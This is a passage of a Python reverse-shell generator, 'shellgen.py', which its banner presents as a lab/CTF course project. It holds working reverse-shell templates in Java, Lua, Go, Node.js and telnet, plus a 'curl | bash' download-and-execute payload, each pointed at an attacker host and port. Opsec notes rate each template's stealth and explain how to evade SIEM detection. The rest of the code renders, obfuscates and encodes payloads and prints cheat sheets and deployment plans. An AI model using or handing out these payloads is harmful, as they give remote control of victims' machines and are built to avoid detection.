            "r=Runtime.getRuntime();"
            "p=r.exec(new String[]{\"bash\",\"-c\","
            "\"exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5|"
            "while read l;do $l 2>&5>&5;done\"});"
            "p.waitFor()"
        ),
        stealth=5,
        opsec_notes=[
            "▸ Used in deserialization and EL/OGNL injection exploit chains",
            "▸ Runtime.exec() monitored by JVM security managers in hardened JVMs",
            "▸ Common in: Log4Shell (CVE-2021-44228), WebLogic, Jenkins Groovy console",
            "▸ JVM spawning /bin/bash is an anomaly alert in app-server environments",
        ],
        encodable=["b64"],
        tags=["java", "rce", "deserialization"],
        mitre=["T1059.007"],
    ),

    # ── LUA ───────────────────────────────────────────────────────────────────
    _t(
        name="lua-socket",
        lang="lua", platform="linux",
        description="Lua luasocket reverse shell — very low SIEM rule coverage",
        template=(
            "lua -e \"require('socket');"
            "t=socket.tcp();"
            "t:connect('{LHOST}','{LPORT}');"
            "while true do "
            "local r,x=t:receive();"
            "local f=io.popen(r,'r');"
            "local s=f:read('*a');"
            "t:send(s) end;\""
        ),
        stealth=7,
        opsec_notes=[
            "▸ Lua has very low rule coverage in most SIEMs as of 2025",
            "▸ Requires lua-socket library — not installed by default on most systems",
            "▸ LuaJIT sometimes available as a dependency of gaming/multimedia packages",
            "▸ No PTY — command output only, no interactive shell features",
        ],
        encodable=["b64"],
        tags=["lua", "no-nc", "living-off-the-land"],
        mitre=["T1059.007"],
    ),

    # ── GOLANG ────────────────────────────────────────────────────────────────
    _t(
        name="go-tcp",
        lang="go", platform="any",
        description="Go one-liner reverse shell (requires Go toolchain on target)",
        template=(
            "echo 'package main;"
            "import (\"net\";\"os\";\"os/exec\");"
            "func main(){"
            "c,_:=net.Dial(\"tcp\",\"{LHOST}:{LPORT}\");"
            "cmd:=exec.Command(\"/bin/sh\");"
            "cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;"
            "cmd.Run()}' > /tmp/.go_shell.go && go run /tmp/.go_shell.go"
        ),
        stealth=6,
        opsec_notes=[
            "▸ Compiled binary has no Python/bash dependency — bypasses interpreter-based rules",
            "▸ Requires Go toolchain on target — unusual on production systems",
            "▸ 'go run' creates a temp binary in /tmp — anomalous for most server roles",
            "▸ Typically deployed pre-compiled (binary upload) rather than compiled on target",
        ],
        encodable=["b64"],
        tags=["go", "compiled", "cross-platform"],
        mitre=["T1059.004"],
    ),

    # ── NODE.JS ───────────────────────────────────────────────────────────────
    _t(
        name="nodejs-tcp",
        lang="nodejs", platform="any",
        description="Node.js net module reverse shell — common on web servers",
        template=(
            "(function(){"
            "var net=require('net'),"
            "cp=require('child_process'),"
            "sh=cp.spawn('/bin/sh',[]);"
            "var client=new net.Socket();"
            "client.connect({LPORT},'{LHOST}',function(){"
            "client.pipe(sh.stdin);"
            "sh.stdout.pipe(client);"
            "sh.stderr.pipe(client);"
            "});"
            "return /a/;"
            "})()"
        ),
        stealth=6,
        opsec_notes=[
            "▸ Common RCE vector on Express/Koa/Next.js servers via app-layer injection",
            "▸ child_process.spawn('/bin/sh') is the key detection indicator",
            "▸ net.Socket + spawn combo detected by some Node.js security modules",
            "▸ Requires Node.js runtime — extremely common on modern web infrastructure",
        ],
        encodable=["b64"],
        tags=["nodejs", "javascript", "web", "no-nc"],
        mitre=["T1059.007"],
    ),

    # ── TELNET ────────────────────────────────────────────────────────────────
    _t(
        name="telnet-pipe",
        lang="telnet", platform="linux",
        description="telnet piped through mkfifo — substitute for nc",
        template=(
            "TF=$(mktemp -u); mkfifo $TF; "
            "telnet {LHOST} {LPORT} 0<$TF | /bin/sh 1>$TF 2>&1; rm -f $TF"
        ),
        stealth=5,
        opsec_notes=[
            "▸ Uses telnet as a replacement for nc in environments where nc is blocked",
            "▸ mktemp -u generates a unique FIFO path — harder to block by fixed path",
            "▸ Telnet outbound is uncommon and often blocked by egress firewalls",
            "▸ telnet binary increasingly absent from hardened/minimal systems",
        ],
        encodable=["url"],
        tags=["telnet", "no-nc", "fifo"],
        mitre=["T1059.004"],
        listener="nc -lvnp {LPORT}",
    ),

    # ── CURL/WGET ─────────────────────────────────────────────────────────────
    _t(
        name="curl-bash",
        lang="curl", platform="linux",
        description="Download-and-execute delivery — chain with any shell payload",
        template="curl -fsSL http://{LHOST}:{LPORT}/shell.sh | bash",
        stealth=4,
        opsec_notes=[
            "▸ curl|bash is a well-documented supply-chain attack pattern",
            "▸ Network IDS sees outbound HTTP GET to attacker IP",
            "▸ Process tree: curl spawning bash is a high-confidence detection indicator",
            "▸ Use to deliver a more complex payload (socat-ssl, python3-pty, etc.)",
            "▸ Requires HTTP server: python3 -m http.server {LPORT} --directory /tmp",
        ],
        encodable=["url"],
        tags=["curl", "http", "delivery", "no-nc"],
        mitre=["T1059.004", "T1071.001"],
        listener="python3 -m http.server {LPORT} --directory /tmp",
    ),

)


# ─────────────────────────────────────────────────────────────────────────────
# Template helpers
# ─────────────────────────────────────────────────────────────────────────────

def get_template(name: str) -> Optional[PayloadTemplate]:
    for t in TEMPLATE_DB:
        if t.name == name:
            return t
    return None


def filter_templates(
    platform:    Optional[str] = None,
    lang:        Optional[str] = None,
    min_stealth: int = 0,
    tag:         Optional[str] = None,
) -> Tuple[PayloadTemplate, ...]:
    result = []
    for t in TEMPLATE_DB:
        if platform and t.platform not in (platform, "any"):
            continue
        if lang and t.lang != lang:
            continue
        if t.stealth < min_stealth:
            continue
        if tag and tag not in t.tags:
            continue
        result.append(t)
    return tuple(result)


# ─────────────────────────────────────────────────────────────────────────────
# Output formatters
# ─────────────────────────────────────────────────────────────────────────────

# Column widths (plain-text widths — ANSI codes added on top)
_CW = {"name": 23, "lang": 12, "platform": 9, "stealth": 21, "desc": 40}


def _pad(text: str, width: int, colour: str = "") -> str:
    pad = max(0, width - C.width(text))
    return (colour + text + C.RST if colour else text) + " " * pad


def _print_header(lhost: Optional[str], lport: Optional[int]) -> None:
    parts = [f"{C.BOLD}{C.CYN}  shellgen.py{C.RST}"]
    if lhost:
        parts.append(f"lhost={C.YEL}{lhost}{C.RST}")
    if lport:
        parts.append(f"lport={C.YEL}{lport}{C.RST}")
    print("\n  " + f"  {C.GRAY}|{C.RST}  ".join(parts) + "\n")


def print_table(templates: Tuple[PayloadTemplate, ...]) -> None:
    hdr = (
        f"  {C.BOLD}"
        + _pad("NAME",     _CW["name"])
        + _pad("LANG",     _CW["lang"])
        + _pad("PLATFORM", _CW["platform"])
        + _pad("STEALTH",  _CW["stealth"])
        + "DESCRIPTION"
        + C.RST
    )
    sep_w = _CW["name"] + _CW["lang"] + _CW["platform"] + _CW["stealth"] + 40
    print(hdr)
    print("  " + C.GRAY + "─" * sep_w + C.RST)
    for t in templates:
        row = (
            "  "
            + _pad(t.name,     _CW["name"],     C.CYN)
            + _pad(t.lang,     _CW["lang"],     C.WHT)
            + _pad(t.platform, _CW["platform"], C.GRAY)
            + _pad(stealth_bar(t.stealth), _CW["stealth"] + 14)
            + C.DIM + t.description + C.RST
        )
        print(row)
    print(f"\n  {C.GRAY}{len(templates)} template(s) shown{C.RST}\n")


def print_payload_box(
    template:   PayloadTemplate,
    payload:    str,
    lhost:      str,
    lport:      int,
    encoded:    bool = False,
    obfuscated: bool = False,
    encode_mode: str = "plain",
) -> None:
    eff   = OpsecAnalyzer.effective_stealth(template, encoded, obfuscated)
    notes = OpsecAnalyzer.notes(template, encoded, obfuscated)
    W     = 66
    fp    = template.sha256(lhost, lport)[:16]

    def top(title: str) -> str:
        p = W - C.width(title) - 4
        return f"  {C.BOLD}{C.BLU}╔══ {title} {'═' * max(p, 0)}{C.RST}"

    def row(text: str) -> str:
        return f"  {C.BLU}║{C.RST}  {text}"

    def div(label: str) -> str:
        p = W - len(label) - 4
        return f"  {C.BLU}╠══ {C.BOLD}{label}{C.RST}{C.BLU} {'═' * max(p, 0)}{C.RST}"

    def bot() -> str:
        return f"  {C.BLU}╚{'═' * W}{C.RST}"

    title = f"{template.name.upper()} — {template.description}"
    print(top(title))
    print(row(f"Language  : {C.CYN}{template.lang}{C.RST}   Platform : {C.CYN}{template.platform}{C.RST}"))
    print(row(f"Stealth   : {stealth_bar(eff)}"))
    print(row(f"Fingerprint: {C.GRAY}{fp}…{C.RST}  (SHA-256 of rendered payload)"))
    if encoded:
        print(row(f"Encoding  : {C.YEL}{encode_mode}{C.RST}"))
    if obfuscated:
        print(row(f"Obfuscated: {C.YEL}yes{C.RST}"))
    if template.tags:
        print(row(f"Tags      : {C.GRAY}{' · '.join(template.tags)}{C.RST}"))
    if template.mitre:
        mitre_str = "  ".join(f"{C.MAG}{m}{C.RST}" for m in template.mitre)
        print(row(f"MITRE     : {mitre_str}"))
    print(div("PAYLOAD"))
    print()
    # Wrap payload at semicolons for readability
    for chunk in payload.split(";"):
        chunk = chunk.strip()
        if chunk:
            print(f"  {C.GRN}{chunk};{C.RST}")
    print()
    print(div("OPSEC NOTES"))
    for note in notes:
        colour = C.RED if note.startswith("▸") else C.GRN
        print(row(f"{colour}{note}{C.RST}"))
    print(bot())
    print()


def print_deployment_plan(
    template: PayloadTemplate,
    lhost: str,
    lport: int,
    payload: str,
) -> None:
    W     = 66
    title = f"DEPLOYMENT PLAN — {template.name}"
    p     = W - len(title) - 4
    print(f"  {C.BOLD}{C.MAG}╔══ {title} {'═' * max(p, 0)}{C.RST}")
    steps = DeploymentPlanner.generate(template, lhost, lport, payload)
    for label, cmd in steps:
        print(f"\n  {C.MAG}║{C.RST}  {C.BOLD}{C.WHT}{label}{C.RST}")
        for line in cmd.splitlines():
            print(f"  {C.MAG}║{C.RST}  {C.YEL}{line}{C.RST}")
    print(f"  {C.MAG}╚{'═' * W}{C.RST}\n")


def print_cheatsheet(
    templates: Tuple[PayloadTemplate, ...], lhost: str, lport: int
) -> None:
    W = 70
    print(f"\n  {C.BOLD}{C.CYN}{'═' * W}{C.RST}")
    print(f"  {C.BOLD}  SHELLGEN CHEAT SHEET   lhost={lhost}  lport={lport}{C.RST}")
    print(f"  {C.BOLD}{C.CYN}{'═' * W}{C.RST}\n")
    for t in templates:
        bar = stealth_bar(t.stealth, width=6)
        print(f"  {C.BOLD}{C.YEL}[{t.name}]{C.RST}  {C.GRAY}{t.lang} / {t.platform}{C.RST}  {bar}")
        print(f"  {C.GRN}{t.render(lhost, lport)}{C.RST}")
        print()
    print(f"  {C.GRAY}Total: {len(templates)} payloads{C.RST}\n")


def print_json_output(
    templates: Tuple[PayloadTemplate, ...], lhost: str, lport: int
) -> None:
    out = []
    for t in templates:
        rendered = t.render(lhost, lport)
        out.append({
            "name":        t.name,
            "lang":        t.lang,
            "platform":    t.platform,
            "description": t.description,
            "stealth":     t.stealth,
            "tags":        list(t.tags),
            "mitre":       list(t.mitre),
            "opsec_notes": list(t.opsec_notes),
            "payload":     rendered,
            "sha256":      t.sha256(lhost, lport),
            "listener":    t.listener.replace("{LPORT}", str(lport)),
            "encodable":   list(t.encodable),
        })
    print(json.dumps(out, indent=2))


# ─────────────────────────────────────────────────────────────────────────────
# Banner
# ─────────────────────────────────────────────────────────────────────────────

BANNER = f"""\
{C.BOLD}{C.CYN}
  ░██████╗██╗  ██╗███████╗██╗     ██╗      ██████╗ ███████╗███╗   ██╗
  ██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝ ██╔════╝████╗  ██║
  ╚█████╗ ███████║█████╗  ██║     ██║     ██║  ███╗█████╗  ██╔██╗ ██║
   ╚═══██╗██╔══██║██╔══╝  ██║     ██║     ██║   ██║██╔══╝  ██║╚██╗██║
  ██████╔╝██║  ██║███████╗███████╗███████╗╚██████╔╝███████╗██║ ╚████║
  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝
{C.RST}{C.GRAY}  Engineer-grade reverse shell generator · 25+ templates · 12 languages
  Module 01 · Week 1 · Project 5  ·  FOR AUTHORIZED LAB/CTF USE ONLY
{C.RST}"""


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="shellgen.py",
        description="Engineer-grade reverse shell payload generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  shellgen.py --list
  shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-tcp
  shellgen.py --lhost 192.168.100.10 --lport 4444 --name python3-socket --encode b64
  shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-tcp --obfuscate
  shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-fifo --plan
  shellgen.py --lhost 192.168.100.10 --lport 4444 --cheatsheet
  shellgen.py --lhost 192.168.100.10 --lport 4444 --platform linux --min-stealth 6
  shellgen.py --listen 4444
  shellgen.py --lhost 192.168.100.10 --lport 4444 --name ps-socket --encode ps_enc
  shellgen.py --lhost 192.168.100.10 --lport 4444 --tag ssl --format json
""",
    )

    tgt = p.add_argument_group("target")
    tgt.add_argument("--lhost", metavar="IP",   help="Attacker IP / listener address")
    tgt.add_argument("--lport", metavar="PORT", type=int, default=4444,
                     help="Listener port (default: 4444)")

    sel = p.add_argument_group("payload selection")
    sel.add_argument("--name",        metavar="NAME",  help="Render a specific payload by name")
    sel.add_argument("--list",        action="store_true", help="List all templates in a table")
    sel.add_argument("--cheatsheet",  action="store_true", help="Print all payloads as a cheat sheet")
    sel.add_argument("--platform",    metavar="PLAT", choices=["linux", "windows", "any"],
                     help="Filter by platform")
    sel.add_argument("--lang",        metavar="LANG",  help="Filter by language (bash, python3 …)")
    sel.add_argument("--tag",         metavar="TAG",   help="Filter by tag (ssl, pty, no-nc …)")
    sel.add_argument("--min-stealth", metavar="N", type=int, default=0,
                     help="Minimum stealth score 1–10")

    xfm = p.add_argument_group("transformation")
    xfm.add_argument("--encode",    metavar="MODE", choices=EncodingEngine.MODES,
                     default="plain", help="plain (default) · b64 · url · ps_enc")
    xfm.add_argument("--obfuscate", action="store_true",
                     help="Shallow obfuscation: variable renaming + IP splitting")

    out = p.add_argument_group("output")
    out.add_argument("--plan",   action="store_true", help="Print 4-step deployment plan")
    out.add_argument("--format", choices=["table", "json"], default="table",
                     help="Output format for --list / --cheatsheet (default: table)")

    lst = p.add_argument_group("listener")
    lst.add_argument("--listen", metavar="PORT", type=int,
                     help="Start a built-in TCP listener on PORT (no nc required)")

    return p


def main() -> None:
    parser = build_parser()
    args   = parser.parse_args()

    # ── Listener mode ──────────────────────────────────────────────────────
    if args.listen:
        print(BANNER)
        TCPListener.listen(args.listen)
        return

    print(BANNER)

    # ── List / filter-only mode ────────────────────────────────────────────
    if args.list or (not args.name and not args.cheatsheet):
        templates = filter_templates(
            platform    = args.platform,
            lang        = args.lang,
            min_stealth = args.min_stealth,
            tag         = args.tag,
        )
        if not templates:
            print(f"  {C.RED}No templates match the given filters.{C.RST}\n")
            return
        _print_header(args.lhost, args.lport if args.lport else None)
        if args.format == "json" and args.lhost:
            print_json_output(templates, args.lhost, args.lport)
        else:
            print_table(templates)
        if not args.lhost:
            print(
                f"  {C.GRAY}Tip: add --lhost <IP> --name <NAME> to render a payload.{C.RST}\n"
            )
        return

    # ── Require --lhost for rendering ──────────────────────────────────────
    if not args.lhost:
        parser.error("--lhost is required when rendering payloads")

    # ── Cheat sheet mode ───────────────────────────────────────────────────
    if args.cheatsheet:
        templates = filter_templates(
            platform    = args.platform,
            lang        = args.lang,
            min_stealth = args.min_stealth,
            tag         = args.tag,
        )
        if args.format == "json":
            print_json_output(templates, args.lhost, args.lport)
        else:
            print_cheatsheet(templates, args.lhost, args.lport)
        return

    # ── Single payload mode ────────────────────────────────────────────────
    template = get_template(args.name)
    if not template:
        names = ", ".join(t.name for t in TEMPLATE_DB)
        print(f"  {C.RED}Unknown template '{args.name}'.{C.RST}")
        print(f"  {C.GRAY}Available: {names}{C.RST}\n")
        sys.exit(1)

    if args.encode != "plain" and args.encode not in template.encodable:
        print(
            f"  {C.RED}'{template.name}' does not support encoding '{args.encode}'.{C.RST}"
        )
        print(f"  {C.GRAY}Supported: {', '.join(template.encodable) or 'plain only'}{C.RST}\n")
        sys.exit(1)

    # Render → obfuscate → encode
    raw = template.render(args.lhost, args.lport)
    obf = raw
    if args.obfuscate:
        if template.lang == "bash":
            obf = ObfuscationEngine.obfuscate_bash(raw, args.lhost, args.lport)
        elif template.lang in ("python3", "python2"):
            obf = ObfuscationEngine.obfuscate_python(raw, args.lhost, args.lport)
        else:
            print(
                f"  {C.YEL}[!] Obfuscation not implemented for '{template.lang}' "
                f"— using plain payload.{C.RST}\n"
            )

    final = EncodingEngine.encode(obf, args.encode)

    _print_header(args.lhost, args.lport)
    print_payload_box(
        template,
        final,
        lhost      = args.lhost,
        lport      = args.lport,
        encoded    = args.encode != "plain",
        obfuscated = args.obfuscate,
        encode_mode= args.encode,
    )

    if args.plan:
        print_deployment_plan(template, args.lhost, args.lport, final)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n  {C.YEL}[!] Interrupted.{C.RST}\n")
        sys.exit(0)
